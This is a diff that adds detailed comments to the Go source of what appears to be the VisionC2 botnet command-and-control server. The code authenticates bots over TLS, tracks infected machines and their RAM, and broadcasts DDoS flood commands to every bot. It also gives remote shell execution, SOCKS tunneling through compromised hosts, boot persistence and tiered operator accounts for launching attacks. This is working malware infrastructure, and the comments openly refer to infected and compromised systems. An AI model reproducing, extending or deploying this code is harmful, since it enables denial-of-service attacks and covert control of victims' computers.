@@ -88,7 +88,18 @@ var (
 	maxAttacks = 20
 )
 
-// Authentication functions - only keep what's needed for C2
+// ============================================================================
+// AUTHENTICATION FUNCTIONS
+// These functions handle the challenge-response authentication between
+// the CNC server and bots. Uses MD5 hashing with the magic code to verify
+// that connecting bots are legitimate.
+// ============================================================================
+
+// generateAuthResponse creates an MD5-based authentication response
+// Takes a random challenge string and the shared secret (magic code)
+// Concatenates challenge + secret + challenge, then MD5 hashes it
+// Returns Base64 encoded hash that must match the bot's response
+// This ensures bots know the magic code without transmitting it in plaintext
 func generateAuthResponse(challenge, secret string) string {
 	h := md5.New()
 	h.Write([]byte(challenge + secret + challenge))
@@ -96,6 +107,11 @@ func generateAuthResponse(challenge, secret string) string {
 	return response
 }
 
+// randomChallenge generates a random alphanumeric string for authentication
+// Creates a unique challenge for each bot connection attempt
+// Uses standard alphanumeric charset (a-z, A-Z, 0-9) for compatibility
+// Length parameter determines challenge complexity (typically 32 chars)
+// Each bot gets a different challenge preventing replay attacks
 func randomChallenge(length int) string {
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, length)
@@ -105,14 +121,25 @@ func randomChallenge(length int) string {
 	return string(b)
 }
 
-// Bot management functions
+// ============================================================================
+// BOT MANAGEMENT FUNCTIONS
+// These functions manage the lifecycle of bot connections including
+// registration, removal, cleanup, and tracking of bot metadata.
+// Thread-safe operations using RWMutex for concurrent access.
+// ============================================================================
+
+// addBotConnection registers a newly authenticated bot in the connections map
+// Handles duplicate bot IDs by closing the old connection (prevents stale entries)
+// Stores bot metadata: connection socket, unique ID, architecture, RAM, timestamps
+// Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
+// Maintains both new map-based storage and legacy slice for backwards compatibility
 func addBotConnection(conn net.Conn, botID string, arch string, ram int64) {
 	botConnsLock.Lock()
 	defer botConnsLock.Unlock()
 
-	// Check for duplicates
+	// Check for duplicates - if same bot reconnects, close old socket
 	if existing, exists := botConnections[botID]; exists {
-		// Close old connection
+		// Close old connection to prevent zombie sockets
 		if existing.conn != nil {
 			existing.conn.Close()
 		}
@@ -139,6 +166,12 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64) {
 		botID, arch, ram, conn.RemoteAddr(), botCount)
 }
 
+// removeBotConnection cleanly removes a bot from all tracking structures
+// Closes the network connection to free up system resources
+// Removes from main connections map and decrements global bot count
+// Also cleans up the command origin map (tracks which user sent commands)
+// Removes from legacy botConns slice for backwards compatibility
+// Thread-safe with mutex locking for both maps
 func removeBotConnection(botID string) {
 	botConnsLock.Lock()
 	defer botConnsLock.Unlock()
@@ -148,12 +181,12 @@ func removeBotConnection(botID string) {
 		delete(botConnections, botID)
 		botCount--
 
-		// Remove from command origin map
+		// Remove from command origin map (tracks user->bot command routing)
 		originLock.Lock()
 		delete(commandOrigin, botID)
 		originLock.Unlock()
 
-		// Remove from legacy list
+		// Remove from legacy list for backwards compatibility
 		for i, conn := range botConns {
 			if conn == botConn.conn {
 				botConns = append(botConns[:i], botConns[i+1:]...)
@@ -163,6 +196,11 @@ func removeBotConnection(botID string) {
 	}
 }
 
+// cleanupDeadBots runs as a background goroutine to remove stale connections
+// Checks every 60 seconds for bots that haven't sent a PONG in 5 minutes
+// Dead bots can occur from network issues, bot crashes, or firewall blocks
+// Prevents resource leaks from accumulating zombie connections over time
+// Logs cleanup activity for monitoring and debugging purposes
 func cleanupDeadBots() {
 	ticker := time.NewTicker(60 * time.Second)
 	defer ticker.Stop()
@@ -172,8 +210,9 @@ func cleanupDeadBots() {
 		now := time.Now()
 		deadBots := []string{}
 
+		// Scan all bots and check last ping timestamp
 		for botID, botConn := range botConnections {
-			// If bot hasn't pinged in 5 minutes, consider it dead
+			// 5 minute timeout - generous to handle network latency
 			if now.Sub(botConn.lastPing) > 5*time.Minute {
 				deadBots = append(deadBots, botID)
 				fmt.Printf("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)\n",
@@ -201,10 +240,24 @@ func cleanupDeadBots() {
 	}
 }
 
-// Handle bot connection with authentication
+// ============================================================================
+// BOT CONNECTION HANDLER
+// Main function that handles the entire lifecycle of a bot connection:
+// 1. Challenge-response authentication to verify bot legitimacy
+// 2. Protocol version verification for compatibility
+// 3. Bot registration with metadata (ID, arch, RAM)
+// 4. Continuous command loop for receiving bot responses and pings
+// 5. Cleanup on disconnect to free resources
+// ============================================================================
+
+// handleBotConnection manages authentication and command routing for a single bot
+// Runs as a goroutine for each incoming bot connection
+// Implements the full authentication handshake protocol
+// Routes shell command output back to the user who issued the command
+// Handles Base64-encoded output for binary-safe transmission
 func handleBotConnection(conn net.Conn) {
 	defer func() {
-		// Find and remove from connections map
+		// Cleanup: Find and remove bot from connections map on disconnect
 		botConnsLock.Lock()
 		for botID, botConn := range botConnections {
 			if botConn.conn == conn {
@@ -402,24 +455,34 @@ func handleBotConnection(conn net.Conn) {
 	}
 }
 
-// Forward bot response to user with formatting
+// forwardBotResponseToUser sends shell command output to the user who requested it
+// Formats the output with ANSI colors for visual clarity in terminal
+// Includes the bot ID so users know which bot generated the response
+// Wraps output in decorative borders for easy reading
+// Handles edge case of output not ending with newline
 func forwardBotResponseToUser(botID, response string, userConn net.Conn) {
 	if response == "" {
 		return
 	}
 
-	// Send formatted output to user
+	// Send formatted output with colored header and borders
 	userConn.Write([]byte(fmt.Sprintf("\033[1;36m[Bot: %s] Shell Output:\r\n", botID)))
 	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
-	userConn.Write([]byte("\033[0m"))
+	userConn.Write([]byte("\033[0m")) // Reset color for actual output
 	userConn.Write([]byte(response))
 	if !strings.HasSuffix(response, "\n") {
 		userConn.Write([]byte("\r\n"))
 	}
 	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
-	userConn.Write([]byte("\033[0m"))
+	userConn.Write([]byte("\033[0m")) // Reset color after output
 }
 
+// pingHandler sends periodic PING messages to keep bot connections alive
+// Runs as a goroutine for each authenticated bot
+// Sends PING every 30 seconds to verify bot is still responsive
+// Bot responds with PONG which updates lastPing timestamp
+// Stops gracefully when stop channel is closed (bot disconnects)
+// Connection errors cause handler to exit (triggers cleanup)
 func pingHandler(conn net.Conn, botID string, stop chan struct{}) {
 	ticker := time.NewTicker(30 * time.Second)
 	defer ticker.Stop()
@@ -427,15 +490,22 @@ func pingHandler(conn net.Conn, botID string, stop chan struct{}) {
 	for {
 		select {
 		case <-ticker.C:
+			// Send PING, exit on error (connection dead)
 			if _, err := conn.Write([]byte("PING\n")); err != nil {
 				return
 			}
 		case <-stop:
+			// Graceful shutdown requested
 			return
 		}
 	}
 }
 
+// safeSubstring extracts a substring without risking index out of bounds panic
+// Go panics on bad slice indices, this prevents crashes on malformed input
+// Used for logging partial strings (e.g., first 10 chars of auth response)
+// Returns empty string if start is beyond string length
+// Truncates at string end if requested length exceeds remaining chars
 func safeSubstring(s string, start, length int) string {
 	if start >= len(s) {
 		return ""
@@ -447,7 +517,19 @@ func safeSubstring(s string, start, length int) string {
 	return s[start:end]
 }
 
-// Load TLS configuration from server.crt and server.key
+// ============================================================================
+// TLS CONFIGURATION
+// Configures secure TLS 1.2+ encryption for bot-to-CNC communication.
+// Requires server.crt and server.key files generated during setup.
+// Uses modern cipher suites with forward secrecy (ECDHE) for security.
+// ============================================================================
+
+// loadTLSConfig loads X.509 certificates and configures secure TLS settings
+// Requires server.crt (certificate) and server.key (private key) in current dir
+// Enforces TLS 1.2 minimum to reject outdated/vulnerable protocols
+// Prefers X25519 and P256 curves for key exchange (modern and fast)
+// Server cipher preference prevents clients from choosing weak ciphers
+// Fatal error if certs missing - CNC cannot operate without encryption
 func loadTLSConfig() *tls.Config {
 	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
 	if err != nil {
@@ -460,76 +542,127 @@ func loadTLSConfig() *tls.Config {
 		Certificates: []tls.Certificate{cert},
 		MinVersion:   tls.VersionTLS12,
 		CurvePreferences: []tls.CurveID{
-			tls.X25519,
-			tls.CurveP256,
+			tls.X25519,    // Modern, fast elliptic curve
+			tls.CurveP256, // Fallback NIST curve
 		},
 		PreferServerCipherSuites: true,
 		CipherSuites: []uint16{
+			// AES-GCM ciphers with SHA-384/256 for authenticated encryption
 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			// ChaCha20-Poly1305 for devices without AES hardware acceleration
 			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			// AES-128 variants for lower resource environments
 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 		},
 	}
 }
 
-// Permission checking functions
+// ============================================================================
+// PERMISSION CHECKING FUNCTIONS
+// Role-based access control for CNC commands. Each function checks if the
+// authenticated user has sufficient privileges for specific command categories.
+// Permission levels from lowest to highest: Basic < Pro < Admin < Owner
+// ============================================================================
+
+// canUseDDoS checks if user can execute attack commands (UDP, TCP, HTTP floods)
+// Minimum required level: Basic (all authenticated users can use DDoS)
+// This is the most permissive check - anyone with valid login can attack
 func (c *client) canUseDDoS() bool {
 	// Basic users can only use DDoS commands
 	level := c.user.GetLevel()
 	return level == Basic || level == Pro || level == Admin || level == Owner
 }
 
+// canUseShell checks if user can execute shell commands on bots (!shell, !exec)
+// Minimum required level: Admin (elevated privilege required for code execution)
+// Shell access is dangerous - can run arbitrary commands on all bots
+// Also gates SOCKS proxy commands which tunnel traffic through bots
 func (c *client) canUseShell() bool {
-	// Shell commands require Admin or higher
+	// Shell commands require Admin or higher due to security risk
 	level := c.user.GetLevel()
 	return level == Admin || level == Owner
 }
 
+// canUseBotManagement checks if user can manage bot lifecycle (reinstall, kill, persist)
+// Minimum required level: Admin
+// These commands affect bot availability for all users:
+// - !reinstall: Forces bot to re-download and reinstall itself
+// - !lolnogtfo: Kills and removes bot (destructive action)
+// - !persist: Sets up boot persistence on infected systems
 func (c *client) canUseBotManagement() bool {
-	// Bot management requires Admin or Owner
+	// Bot management requires Admin or Owner level privileges
 	level := c.user.GetLevel()
 	return level == Admin || level == Owner
 }
 
+// canUsePrivate checks if user can access owner-only features
+// Minimum required level: Owner (highest privilege level)
+// Private commands include:
+// - Database access (view all user credentials)
+// - System configuration commands
+// - Any future sensitive operations
 func (c *client) canUsePrivate() bool {
-	// Private commands require Owner only
+	// Private commands require Owner only - no delegation
 	level := c.user.GetLevel()
 	return level == Owner
 }
 
+// canTargetSpecificBot checks if user can send commands to individual bots
+// Minimum required level: Pro
+// By default, commands go to ALL bots. This permission allows:
+// - Targeting specific bot by ID: !abc123 <command>
+// - Useful for testing or controlling specific infected systems
+// - Prevents Basic users from accidentally targeting wrong bot
 func (c *client) canTargetSpecificBot() bool {
-	// Targeting specific bots requires Pro or higher
+	// Targeting specific bots requires Pro or higher level
 	level := c.user.GetLevel()
 	return level == Pro || level == Admin || level == Owner
 }
-func (c *client) showHelpMenu(conn net.Conn) {
-	c.writeHeader(conn)
 
+// ============================================================================
+// HELP MENU SYSTEM
+// Dynamically generates help menus based on user's permission level.
+// Only shows commands the user is authorized to execute.
+// Uses ANSI escape codes for colored terminal output.
+// ============================================================================
+
+// showHelpMenu displays available commands based on user's permission level
+// Dynamically builds menu sections - only shows what user can actually use
+// Prevents confusion by hiding unavailable commands from lower-tier users
+// Each section is conditionally rendered based on permission check
+func (c *client) showHelpMenu(conn net.Conn) {
+	c.writeHeader(conn) // Top border with user level
+
+	// All authenticated users see general and attack commands
 	if c.canUseDDoS() {
 		c.writeGeneralCommands(conn)
 		c.writeAttackCommands(conn)
 	}
 
+	// Admin+ sees shell commands
 	if c.canUseShell() {
 		c.writeShellCommands(conn)
 	}
 
+	// Pro+ sees bot targeting
 	if c.canTargetSpecificBot() {
 		c.writeBotTargeting(conn)
 	}
 
+	// Admin+ sees bot management
 	if c.canUseBotManagement() {
 		c.writeBotManagement(conn)
 	}
 
+	// Owner only sees private commands
 	if c.canUsePrivate() {
 		c.writePrivateCommands(conn)
 	}
 
-	c.writeFooter(conn)
+	c.writeFooter(conn) // Bottom border
 }
 
 func (c *client) writeHeader(conn net.Conn) {
@@ -539,6 +672,9 @@ func (c *client) writeHeader(conn net.Conn) {
 	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
 }
 
+// writeGeneralCommands outputs the basic utility commands available to all users
+// Includes: bots list, clear screen, banner, help, ongoing attacks, logout
+// These are non-destructive informational commands
 func (c *client) writeGeneralCommands(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;32mGeneral Commands\033[1;97m                        ║",
@@ -552,6 +688,10 @@ func (c *client) writeGeneralCommands(conn net.Conn) {
 	c.writeSection(conn, commands)
 }
 
+// writeAttackCommands outputs the DDoS attack methods available
+// Covers Layer 4 (UDP, TCP, SYN, ACK, GRE) and Layer 7 (HTTP, HTTPS, TLS)
+// Also documents proxy mode for L7 attacks to route through proxies
+// Commands broadcast to ALL connected bots simultaneously
 func (c *client) writeAttackCommands(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;31mAttack Commands\033[1;97m (sent to ALL bots)                        ║",
@@ -573,6 +713,10 @@ func (c *client) writeAttackCommands(conn net.Conn) {
 	c.writeSection(conn, commands)
 }
 
+// writeShellCommands outputs remote code execution commands (Admin+ only)
+// !shell: Executes command and waits for output (blocking)
+// !detach: Executes command in background (non-blocking, no output)
+// !stream: Real-time output streaming for long-running commands
 func (c *client) writeShellCommands(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)       ║",
@@ -583,6 +727,10 @@ func (c *client) writeShellCommands(conn net.Conn) {
 	c.writeSection(conn, commands)
 }
 
+// writeBotTargeting outputs syntax for targeting individual bots (Pro+ only)
+// Allows sending commands to specific bot by ID prefix or full ID
+// Format: !<botid> <command> - routes command to just that bot
+// Useful for testing commands or controlling specific compromised systems
 func (c *client) writeBotTargeting(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;33mBot Targeting\033[1;97m                           ║",
@@ -592,6 +740,11 @@ func (c *client) writeBotTargeting(conn net.Conn) {
 	c.writeSection(conn, commands)
 }
 
+// writeBotManagement outputs bot lifecycle commands (Admin+ only)
+// !reinstall: Forces bots to re-download and reinstall (update mechanism)
+// !lolnogtfo: Kills bot process - removes from infected system (cleanup)
+// !persist: Sets up boot persistence via cron/systemd/init scripts
+// !info: Requests system info from all bots
 func (c *client) writeBotManagement(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)       ║",
@@ -603,6 +756,11 @@ func (c *client) writeBotManagement(conn net.Conn) {
 	c.writeSection(conn, commands)
 }
 
+// writePrivateCommands outputs owner-only sensitive commands
+// private: Shows this section (meta-command)
+// db: Displays all user credentials from users.json
+// !socks: Establishes SOCKS5 proxy through bots for traffic tunneling
+// !stopsocks: Terminates active proxy connections
 func (c *client) writePrivateCommands(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                             ║",
@@ -625,6 +783,11 @@ func (c *client) writeFooter(conn net.Conn) {
 	conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
 	conn.Write([]byte("\033[0m\r\n"))
 }
+
+// getLevelString converts the numeric permission level to human-readable string
+// Used in UI displays (banner, prompt, help menu) to show user's access tier
+// Returns: "Owner", "Admin", "Pro", "Basic", or "Unknown"
+// Maps internal Level enum values to user-friendly names
 func (c *client) getLevelString() string {
 	level := c.user.GetLevel()
 	switch level {
@@ -641,8 +804,21 @@ func (c *client) getLevelString() string {
 	}
 }
 
+// ============================================================================
+// MAIN ENTRY POINT
+// Initializes the CNC server with two listeners:
+// 1. TLS bot listener on port 443 - accepts encrypted bot connections
+// 2. Plain TCP user listener on configured port - accepts admin CLI logins
+// Creates default root user if users.json doesn't exist.
+// ============================================================================
+
+// main is the CNC server entry point - starts both bot and user servers
+// Creates root user with random password on first run
+// Loads TLS certificates for secure bot communication
+// Starts background goroutines for dead bot cleanup
+// Bot server runs TLS on 443, user CLI runs plain TCP
 func main() {
-	// Check if users.json file exists; if not, create a root user
+	// First run: Create default root user with random 12-char password
 	if _, fileError := os.ReadFile("users.json"); fileError != nil {
 		password, err := randomString(12)
 		if err != nil {
@@ -727,33 +903,42 @@ func main() {
 	}
 }
 
-// Validate TLS handshake and ensure it's from our bot
+// validateTLSHandshake performs TLS security validation on incoming connections
+// Ensures the connection uses TLS 1.2+ (rejects old vulnerable protocols)
+// Validates cipher suite is modern with forward secrecy (ECDHE + AES-GCM/ChaCha20)
+// TLS 1.3 connections auto-accepted (all TLS 1.3 ciphers are secure)
+// Rejects connections that don't meet security standards
+// On success, hands off to handleBotConnection for authentication
 func validateTLSHandshake(conn net.Conn) {
 	defer func() {
+		// Panic recovery to prevent single bad connection from crashing server
 		if r := recover(); r != nil {
 			fmt.Printf("[PANIC] in validateTLSHandshake: %v\n", r)
 			conn.Close()
 		}
 	}()
 
+	// Type assert to TLS connection
 	tlsConn, ok := conn.(*tls.Conn)
 	if !ok {
 		return
 	}
 
+	// 10 second deadline for handshake to prevent slow-loris attacks
 	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
 
 	if err := tlsConn.Handshake(); err != nil {
 		return
 	}
 
+	// Enforce minimum TLS 1.2 - older versions have known vulnerabilities
 	state := tlsConn.ConnectionState()
 	if state.Version < tls.VersionTLS12 {
 		tlsConn.Close()
 		return
 	}
 
-	// Accept all modern cipher suites
+	// Whitelist of acceptable cipher suites with forward secrecy
 	validCiphers := map[uint16]bool{
 		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:   true,
 		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256: true,
@@ -761,9 +946,9 @@ func validateTLSHandshake(conn net.Conn) {
 		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:       true,
 		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:         true,
 		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:       true,
-		0x1301: true,
-		0x1302: true,
-		0x1303: true,
+		0x1301: true, // TLS_AES_128_GCM_SHA256 (TLS 1.3)
+		0x1302: true, // TLS_AES_256_GCM_SHA384 (TLS 1.3)
+		0x1303: true, // TLS_CHACHA20_POLY1305_SHA256 (TLS 1.3)
 	}
 
 	if state.Version == tls.VersionTLS13 {
@@ -776,20 +961,32 @@ func validateTLSHandshake(conn net.Conn) {
 	// Reset deadline for authentication phase
 	tlsConn.SetDeadline(time.Time{})
 
-	// Start authentication process
+	// Start authentication process (runs in goroutine)
 	go handleBotConnection(conn)
 }
 
+// ============================================================================
+// UI UPDATE FUNCTIONS
+// Handle dynamic terminal title updates and statistics display.
+// These run as background goroutines to keep user's terminal updated.
+// ============================================================================
+
+// updateTitle continuously updates the terminal title for connected users
+// Shows live statistics: bot count, ongoing attacks, user info
+// Uses spinning characters (∴/∵) for visual activity indicator
+// Updates every 1-2 seconds for real-time feedback
+// Each client gets their own update goroutine
 func updateTitle() {
 	for {
 		for _, cl := range clients {
 			go func(c *client) {
-				spinChars := []rune{'∴', '∵'}
+				spinChars := []rune{'∴', '∵'} // Spinning animation characters
 				spinIndex := 0
 
 				for {
 					attackCount := len(ongoingAttacks)
 
+					// Format title with live stats
 					title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d/%d | ℣ | User: %s [%s] [%c]",
 						spinChars[spinIndex], getBotCount(), attackCount, maxAttacks, c.user.Username, c.getLevelString(), spinChars[spinIndex])
 					setTitle(c.conn, title)
@@ -802,7 +999,10 @@ func updateTitle() {
 	}
 }
 
-// Get authenticated bot count
+// getBotCount returns the number of authenticated bots currently connected
+// Thread-safe: uses RLock for concurrent read access
+// Only counts bots that have completed authentication handshake
+// Used in title updates and statistics displays
 func getBotCount() int {
 	botConnsLock.RLock()
 	defer botConnsLock.RUnlock()
@@ -815,7 +1015,10 @@ func getBotCount() int {
 	return count
 }
 
-// Get total RAM across all bots (in MB)
+// getTotalRAM calculates total RAM across all authenticated bots (in MB)
+// Thread-safe: uses RLock for concurrent read access
+// Sums up RAM values reported by each bot during registration
+// Used to display aggregate botnet capacity in banner/stats
 func getTotalRAM() int64 {
 	botConnsLock.RLock()
 	defer botConnsLock.RUnlock()
@@ -828,7 +1031,10 @@ func getTotalRAM() int64 {
 	return totalRAM
 }
 
-// Format RAM for display (converts to GB if over 1024MB)
+// formatRAM converts RAM from MB to human-readable string
+// Automatically converts to GB for values >= 1024MB (1GB)
+// Returns formatted string like "512MB" or "2.5GB"
+// Makes large RAM values more readable in UI displays
 func formatRAM(ramMB int64) string {
 	if ramMB >= 1024 {
 		return fmt.Sprintf("%.1fGB", float64(ramMB)/1024.0)
@@ -836,9 +1042,19 @@ func formatRAM(ramMB int64) string {
 	return fmt.Sprintf("%dMB", ramMB)
 }
 
-// New Banner Art - All Seeing Eye with Status Box Inside
+// ============================================================================
+// USER INTERFACE FUNCTIONS
+// Handle visual elements shown to authenticated admin users.
+// Uses ANSI escape codes for colors and box-drawing characters.
+// ============================================================================
+
+// showBanner displays the VisionC2 ASCII art banner with live statistics
+// Clears the terminal and draws the "All Seeing Eye" logo
+// Integrates live stats: status, bot count, protocol version, encryption, total RAM
+// Uses 256-color ANSI codes (38;5;xxx) for purple/gradient effects
+// Called on login and when user types 'banner' command
 func showBanner(conn net.Conn) {
-	conn.Write([]byte("\033[2J\033[H")) // Clear screen
+	conn.Write([]byte("\033[2J\033[H")) // Clear screen and move cursor to home
 	conn.Write([]byte("\r\n"))
 
 	// All Seeing Eye ASCII Art with integrated status box
@@ -865,23 +1081,30 @@ func showBanner(conn net.Conn) {
 	conn.Write([]byte("\r\n"))
 }
 
+// authUser handles the login prompt and credential verification for admin users
+// Allows up to 3 login attempts before disconnecting (brute force protection)
+// Prompts for username and password with styled colored prompts
+// Password field uses white-on-white text (hidden) for privacy
+// On success, creates client struct and adds to active clients list
+// Returns (true, client) on success, (false, nil) on failure
 func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
-	for i := 0; i < 3; i++ {
-		conn.Write([]byte("\033[0m"))
-		conn.Write([]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n"))
+	for i := 0; i < 3; i++ { // 3 attempts max
+		conn.Write([]byte("\033[0m"))                      // Reset colors
+		conn.Write([]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n")) // Spacing
 		conn.Write([]byte("\r                        \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion -- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\n"))
 		conn.Write([]byte("\033[0m\r                       ☉ Username\033[38;5;62m: "))
 		username, err := getFromConnReader(reader)
 		if err != nil {
 			return false, nil
 		}
+		// Password uses white text on white background (invisible typing)
 		conn.Write([]byte("\033[0m\r                       ☉ Password\033[38;5;62m: \033[38;5;255m\033[48;5;255m"))
 		password, err := getFromConnReader(reader)
 		if err != nil {
 			return false, nil
 		}
-		conn.Write([]byte("\033[0m"))
-		conn.Write([]byte("\033[2J\033[3J"))
+		conn.Write([]byte("\033[0m"))        // Reset after hidden password
+		conn.Write([]byte("\033[2J\033[3J")) // Clear screen
 
 		if exists, user := AuthUser(username, password); exists {
 			loggedClient := &client{
@@ -896,6 +1119,16 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 	return false, nil
 }
 
+// ============================================================================
+// CONNECTION I/O UTILITIES
+// Helper functions for reading user input from network connections.
+// Handle line-based text protocols (Telnet-style) with newline trimming.
+// ============================================================================
+
+// getFromConn reads a single line from a network connection (creates new reader)
+// Reads until newline delimiter (Telnet-style line input)
+// Strips trailing \n and \r for clean string processing
+// Creates a new bufio.Reader each call - use getFromConnReader for reuse
 func getFromConn(conn net.Conn) (string, error) {
 	readString, err := bufio.NewReader(conn).ReadString('\n')
 	if err != nil {
@@ -906,6 +1139,10 @@ func getFromConn(conn net.Conn) (string, error) {
 	return readString, nil
 }
 
+// getFromConnReader reads a single line using existing bufio.Reader
+// More efficient than getFromConn - reuses reader buffer across reads
+// Used in user session loops where multiple inputs are expected
+// Strips trailing newlines for clean command parsing
 func getFromConnReader(reader *bufio.Reader) (string, error) {
 	readString, err := reader.ReadString('\n')
 	if err != nil {
@@ -916,7 +1153,17 @@ func getFromConnReader(reader *bufio.Reader) (string, error) {
 	return readString, nil
 }
 
-// Send commands to authenticated bots only
+// ============================================================================
+// BOT COMMAND DISTRIBUTION
+// Functions for sending commands to bots (broadcast or targeted).
+// Handle command routing, error recovery, and response tracking.
+// ============================================================================
+
+// sendToBots broadcasts a command to ALL authenticated bots
+// Thread-safe: uses RLock to allow concurrent command sends
+// Failed sends trigger async bot removal (don't block other sends)
+// Logs command with sent count vs total for verification
+// Used by DDoS commands, shell commands, and bot management
 func sendToBots(command string) {
 	botConnsLock.RLock()
 	defer botConnsLock.RUnlock()
@@ -927,7 +1174,7 @@ func sendToBots(command string) {
 			_, err := botConn.conn.Write([]byte(command + "\n"))
 			if err != nil {
 				fmt.Printf("[ERROR] Failed to send to bot %s: %v\n", botConn.botID, err)
-				// Mark for cleanup
+				// Mark for cleanup in background (don't block other sends)
 				go removeBotConnection(botConn.botID)
 			} else {
 				sentCount++
@@ -938,15 +1185,20 @@ func sendToBots(command string) {
 	fmt.Printf("[COMMAND] Sent to %d/%d bots: %s\n", sentCount, len(botConnections), command)
 }
 
-// Send command to a specific bot by ID
+// sendToBot sends a command to a specific bot by ID (full or partial match)
+// Supports partial ID matching (first N characters) for convenience
+// Tracks command origin in commandOrigin map so response routes back to user
+// Returns true if command was sent successfully, false otherwise
+// Used for !<botid> <command> syntax to target individual bots
 func sendToBot(botID string, command string, userConn net.Conn, c *client) bool {
 	botConnsLock.RLock()
 	defer botConnsLock.RUnlock()
 
 	for id, botConn := range botConnections {
+		// Match full ID or partial prefix
 		if id == botID || strings.HasPrefix(id, botID) {
 			if botConn.authenticated {
-				// Track which user sent this command
+				// Track which user sent this command for response routing
 				originLock.Lock()
 				commandOrigin[botConn.botID] = userConn
 				originLock.Unlock()
@@ -966,12 +1218,17 @@ func sendToBot(botID string, command string, userConn net.Conn, c *client) bool 
 	return false
 }
 
-// Find bot by ID (full or partial match)
+// findBotByID looks up a bot connection by ID (supports partial matching)
+// Returns the first bot whose ID matches or starts with the given string
+// Thread-safe with RLock for concurrent access
+// Returns nil if no matching bot found
+// Used to validate bot existence before sending targeted commands
 func findBotByID(botID string) *BotConnection {
 	botConnsLock.RLock()
 	defer botConnsLock.RUnlock()
 
 	for id, botConn := range botConnections {
+		// Match exact ID or prefix for partial ID targeting
 		if id == botID || strings.HasPrefix(id, botID) {
 			return botConn
 		}
@@ -979,8 +1236,19 @@ func findBotByID(botID string) *BotConnection {
 	return nil
 }
 
+// ============================================================================
+// USER SESSION HANDLER
+// Main function handling admin CLI sessions from login to command processing.
+// Implements the full user interface: login, banner, command loop, logout.
+// ============================================================================
+
+// handleRequest processes an incoming user connection for admin CLI access
+// Performs Telnet negotiation for proper terminal handling
+// Requires "spamtec" prefix as connection identifier/handshake
+// Handles authentication, banner display, and main command loop
+// Processes all user commands: attacks, shell, bot management, etc.
 func handleRequest(conn net.Conn) {
-	defer conn.Close()
+	defer conn.Close() // Clean up on exit
 
 	// Telnet negotiation for proper terminal handling
 	// IAC WILL ECHO, IAC WILL SGA (suppress go ahead), IAC WONT LINEMODE
